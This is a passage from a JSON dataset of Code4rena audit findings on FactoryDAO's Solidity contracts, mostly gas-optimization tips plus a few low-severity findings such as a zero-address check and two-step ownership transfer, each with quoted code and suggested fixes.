      "content": "\n```solidity\nFile: contracts/MerkleLib.sol   #1\n\n37          if (a < b) {\n38              return keccak256(abi.encode(a, b));\n39          } else {\n40              return keccak256(abi.encode(b, a));\n41          }\n```\n\nchange to `return keccak256(a < b ? abi.encode(a, b) : abi.encode(b, a)`\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleLib.sol#L37-L41>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42582",
      "title": "[15] `public` library function should be made `private`/`internal`",
      "impact": "GAS",
      "content": "\nChanging from `public` will remove the compiler-introduced checks for `msg.value` and decrease the contract's method ID table size\n\n```solidity\nFile: contracts/MerkleLib.sol   #1\n\n36      function parentHash(bytes32 a, bytes32 b) public pure returns (bytes32) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleLib.sol#L36>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42581",
      "title": "[14] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27>\nUse `uint256(1)` and `uint256(2)` for true/false\n\n```solidity\nFile: /contracts/MerkleDropFactory.sol   #1\n\n29       mapping (address => mapping (uint => bool)) public withdrawn;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L29>\n\n```solidity\nFile: /contracts/MerkleResistor.sol   #2\n\n50       mapping (address => mapping (uint => bool)) public initialized;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L50>\n\n```solidity\nFile: /contracts/MerkleVesting.sol   #3\n\n38       mapping (address => mapping (uint => bool)) public initialized;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L38>\n\n```solidity\nFile: /contracts/VoterID.sol   #4\n\n21       mapping (address => mapping (address => bool)) public operatorApprovals;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L21>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42580",
      "title": "[13] Remove unused local variable",
      "impact": "GAS",
      "content": "\n```solidity\nFile: /contracts/FixedPricePassThruGate.sol   #1\n\n53               (bool sent, bytes memory data) = gate.beneficiary.call{value: gate.ethCost}(\"\");\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/FixedPricePassThruGate.sol#L53>\n\n```solidity\nFile: /contracts/SpeedBumpPriceGate.sol   #2\n\n79               (bool sent, bytes memory data) = gate.beneficiary.call{value: msg.value}(\"\");\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L79>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42579",
      "title": "[12] Not using the named return variables when a function returns, wastes deployment gas",
      "impact": "GAS",
      "content": "\n```solidity\nFile: /contracts/FixedPricePassThruGate.sol   #1\n\n40           return gate.ethCost;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/FixedPricePassThruGate.sol#L40>\n\n```solidity\nFile: /contracts/MerkleEligibility.sol   #2\n\n50           return numGates;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleEligibility.sol#L50>\n\n```solidity\nFile: /contracts/MerkleEligibility.sol   #3\n\n77           return countValid && gate.totalWithdrawals < gate.maxWithdrawalsTotal && gate.root.verifyProof(leaf, proof);\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleEligibility.sol#L77>\n\n```solidity\nFile: /contracts/SpeedBumpPriceGate.sol   #4\n\n56               return gate.priceFloor;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L56>\n\n```solidity\nFile: /contracts/SpeedBumpPriceGate.sol   #5\n\n58               return gate.lastPrice - decay;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L58>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42578",
      "title": "[11] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nSee [original submission](https://github.com/code-423n4/2022-05-factorydao-findings/issues/95) for full details.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42577",
      "title": "[10] `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "\nThe `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas [*PER LOOP*](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #1\n\n115           for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L115>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #2\n\n141           for (uint i = 0; i < pool.rewardFunding.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L141>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #3\n\n168           for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L168>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #4\n\n224           for (uint i = 0; i < rewards.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L224>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #5\n\n249           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L249>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #6\n\n266           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L266>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42576",
      "title": "[9] `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "\nThe overheads outlined below are *PER LOOP*, excluding the first loop\n\n*   storage arrays incur a Gwarmaccess (100 gas)\n*   memory arrays use `MLOAD` (3 gas)\n*   calldata arrays use `CALLDATALOAD` (3 gas)\n\nCaching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n```solidity\nFile: /contracts/MerkleLib.sol   #1\n\n22           for (uint i = 0; i < proof.length; i += 1) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleLib.sol#L22>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #2\n\n115           for (uint i = 0; i < rewardTokenAddresses.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L115>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #3\n\n141           for (uint i = 0; i < pool.rewardFunding.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L141>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #4\n\n168           for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L168>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #5\n\n224           for (uint i = 0; i < rewards.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L224>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #6\n\n249           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L249>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #7\n\n266           for (uint i = 0; i < pool.rewardTokens.length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L266>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42575",
      "title": "[8] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()`",
      "impact": "GAS",
      "content": "\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n```solidity\nFile: /contracts/MerkleVesting.sol   #1\n\n157               currentWithdrawal = (block.timestamp - tranche.lastWithdrawalTime) * tranche.coinsPerSecond;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L157>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #2\n\n187               amount = pool.maximumDepositWei - pool.totalDepositsWei;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L187>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42574",
      "title": "[7] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #1\n\n137       function fundPool(uint poolId) internal {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L137>\n\n```solidity\nFile: /contracts/VoterID.sol   #2\n\n304       function transfer(address from, address to, uint256 tokenId) internal {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L304>\n\n```solidity\nFile: /contracts/VoterID.sol   #3\n\n343       function isContract(address account) internal view returns (bool) {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L343>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42573",
      "title": "[6] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables",
      "impact": "GAS",
      "content": "\n```solidity\nFile: /contracts/MerkleEligibility.sol   #1\n\n47           numGates += 1;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleEligibility.sol#L47>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42572",
      "title": "[5] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching will replace each Gwarmaccess (100 gas) with a much cheaper stack read.\nLess obvious fixes/optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n[See original submission](https://github.com/code-423n4/2022-05-factorydao-findings/issues/95) for details.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42571",
      "title": "[4] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. Each iteration of this for-loop costs at least 60 gas (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one\n\n```solidity\nFile: /contracts/interfaces/IVoterID.sol   #1\n\n12       function createIdentityFor(address newId, uint tokenId, string memory uri) external;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/interfaces/IVoterID.sol#L12>\n\n```solidity\nFile: /contracts/MerkleEligibility.sol   #2\n\n85       function passThruGate(uint index, address recipient, bytes32[] memory proof) external override {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleEligibility.sol#L85>\n\n```solidity\nFile: /contracts/MerkleIdentity.sol   #3\n\n116       function withdraw(uint merkleIndex, uint tokenId, string memory uri, bytes32[] memory addressProof, bytes32[] memory metadataProof) external payable {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L116>\n\n```solidity\nFile: /contracts/MerkleIdentity.sol   #4\n\n116       function withdraw(uint merkleIndex, uint tokenId, string memory uri, bytes32[] memory addressProof, bytes32[] memory metadataProof) external payable {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L116>\n\n```solidity\nFile: /contracts/MerkleIdentity.sol   #5\n\n116       function withdraw(uint merkleIndex, uint tokenId, string memory uri, bytes32[] memory addressProof, bytes32[] memory metadataProof) external payable {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L116>\n\n```solidity\nFile: /contracts/MerkleResistor.sol   #6\n\n134       function initialize(uint treeIndex, address destination, uint vestingTime, uint minTotalPayments, uint maxTotalPayments, bytes32[] memory proof) external {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L134>\n\n```solidity\nFile: /contracts/MerkleVesting.sol   #7\n\n104       function initialize(uint treeIndex, address destination, uint totalCoins, uint startTime, uint endTime, uint lockPeriodEndTime, bytes32[] memory proof) external {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L104>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #8\n\n95           uint[] memory rewardsWeiPerSecondPerToken,\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L95>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #9\n\n99           address[] memory rewardTokenAddresses,\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L99>\n\n```solidity\nFile: /contracts/VoterID.sol   #10\n\n162       function setTokenURI(uint token, string memory uri) external ownerOnly {\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L162>\n\n```solidity\nFile: /interfaces/IVoterID.sol   #11\n\n12       function createIdentityFor(address newId, uint tokenId, string memory uri) external;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/interfaces/IVoterID.sol#L12>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42570",
      "title": "[3] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "\nAvoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a `PUSH32` (3 gas).\n\n```solidity\nFile: /contracts/MerkleEligibility.sol   #1\n\n16       address public gateMaster;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleEligibility.sol#L16>\n\n```solidity\nFile: /contracts/PermissionlessBasicPoolFactory.sol   #2\n\n51       address public globalBeneficiary;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L51>\n\n```solidity\nFile: /contracts/VoterID.sol   #3\n\n65       string _name;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L65>\n\n```solidity\nFile: /contracts/VoterID.sol   #4\n\n66       string _symbol;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L66>\n\n```solidity\nFile: /contracts/VoterID.sol   #5\n\n74       address public _minter;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L74>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42569",
      "title": "[2] Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot\n\n```solidity\nFile: /contracts/VoterID.sol   #1\n\n18       mapping (address => uint) public balances;\n19   \n20       // Mapping from owner to operator approvals\n21       mapping (address => mapping (address => bool)) public operatorApprovals;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L18-L21>\n\n```solidity\nFile: /contracts/VoterID.sol   #2\n\n28       mapping (address => mapping (uint => uint)) public ownershipMapIndexToToken;\n29       mapping (address => mapping (uint => uint)) public ownershipMapTokenToIndex;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L28-L29>\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #3\n\n56      // pools[poolId] = poolStruct\n57      mapping (uint => Pool) public pools;\n58      // metadatas[poolId] = metadataStruct\n59      mapping (uint => Metadata) public metadatas;\n60      // taxes[poolId] = taxesCollected[rewardIndex]\n61      mapping (uint => uint[]) public taxes;\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L56-L61>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42568",
      "title": "[1] `for`-loops should be broken out of earlier",
      "impact": "GAS",
      "content": "\nIf it's known that the function will revert after the `for`-loop completes, `break` should be used to end the loop early\n\n```solidity\nFile: contracts/PermissionlessBasicPoolFactory.sol   #1\n\n141          for (uint i = 0; i < pool.rewardFunding.length; i++) {\n142              amount = getMaximumRewards(poolId, i);\n143              // transfer the tokens from pool-creator to this contract\n144              success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n```\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L141-L144>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42567",
      "title": "[N-05] Incomplete natspec comment",
      "impact": "LOW",
      "content": "\nThe `@notice` natspec comment on `VoterID` is [incomplete](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L10).\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42566",
      "title": "[N-04] Emit events from privileged operations",
      "impact": "LOW",
      "content": "\nConsider adding events to protected functions that change contract state. This enables you to monitor off chain for suspicious activity, and allows end users to observe and trust changes to these parameters.\n\n*   [`VoterId#setTokenURI`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L163)\n*   [`MerkleIdentity#setManagement`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L60)\n*   [`MerkleIdentity#setTreeAdder`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L67)\n*   [`MerkleIdentity#setIpfsHash`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L75)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42565",
      "title": "[N-03] Move `require` check to top of function",
      "impact": "LOW",
      "content": "\nThe `require` check in `PermissionlessBasicPoolFactory#addPool` comes after several state changes. Consider moving it to the top of the function to follow the checks-effects-interactions pattern.\n\n[`PermissionlessBasicPoolFactory.sol#L112`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L111-L113)\n\n```solidity\n        require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42564",
      "title": "[N-02] `balanceOf` does not revert on zero address query",
      "impact": "LOW",
      "content": "\nAccording to the ERC721 spec and the natspec comment in the code, `VoterID#balanceOf` should revert when called with the zero address, but it does not:\n\n[`VoterID.sol#L168-L175`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L168-L175)\n\n```solidity\n    /// @notice Count all NFTs assigned to an owner\n    /// @dev NFTs assigned to the zero address are considered invalid, and this\n    ///  function throws for queries about the zero address.\n    /// @param _address An address for whom to query the balance\n    /// @return The number of NFTs owned by `owner`, possibly zero\n    function balanceOf(address _address) external view returns (uint256) {\n        return balances[_address];\n    }\n```\n\nSuggestion: Validate that `_address` is not `address(0)` in `balanceOf`:\n\n```solidity\n    /// @notice Count all NFTs assigned to an owner\n    /// @dev NFTs assigned to the zero address are considered invalid, and this\n    ///  function throws for queries about the zero address.\n    /// @param _address An address for whom to query the balance\n    /// @return The number of NFTs owned by `owner`, possibly zero\n    function balanceOf(address _address) external view returns (uint256) {\n        require(_address != address(0), \"ERC721: balance query for the zero address\");\n        return balances[_address];\n    }\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42563",
      "title": "[N-01] Prefer two-step ownership transfers",
      "impact": "LOW",
      "content": "\nIf the `owner` of `VoterID` accidentally transfers ownership to an incorrect address, protected functions may become permanently inaccessible.\n\n[`VoterID.sol#L151-L155`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L151-L155)\n\n```solidity\n    function setOwner(address newOwner) external ownerOnly {\n        address oldOwner = _owner_;\n        _owner_ = newOwner;\n        emit OwnerUpdated(oldOwner, newOwner);\n    }\n```\n\nSuggestion: handle ownership transfers with two steps and two transactions. First, allow the current owner to propose a new owner address. Second, allow the proposed owner (and only the proposed owner) to accept ownership, and update the contract owner internally.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42562",
      "title": "[L-06] `VoterID#transferFrom` does not distinguish nonexistent tokens from unapproved transfers",
      "impact": "LOW",
